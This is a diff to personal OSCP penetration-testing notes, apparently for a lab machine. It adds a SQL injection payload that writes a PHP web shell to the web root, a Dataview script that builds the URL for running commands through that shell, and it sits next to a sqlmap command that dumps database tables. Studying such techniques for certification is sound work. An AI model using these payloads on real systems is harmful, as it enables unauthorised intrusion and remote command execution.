@@ -89,4 +89,27 @@ dump a table's contents
 sqlmap -r reset.req -p email --batch --level 3 -D [database_name] -T [table_name] --dump
 ```
 
+---
+
 [[Synced OSCP Notes/Small Toolkit/Tools/Hashcat|Hashcat]]
+
+---
+
+![[Pasted image 20260526210214.png]]
+
+```
+SELECT "<?php system($_GET['cmd']);?>" INTO OUTFILE "/var/www/html/webshell.php"
+```
+ 
+Burpsuite payload, upload a webshell.
+
+Since nmap scan told us port 3305 is open, we are uploading the webshell there
+
+Visit
+```dataviewjs
+const page = dv.page("Synced OSCP Notes/Top/Active Machine");const ip = page?.IP ?? "NO IP FOUND";
+
+const command = `http://${ip}:3305/webshell.php?cmd=id`;
+
+dv.paragraph("```bash\n" + command + "\n```");
+```
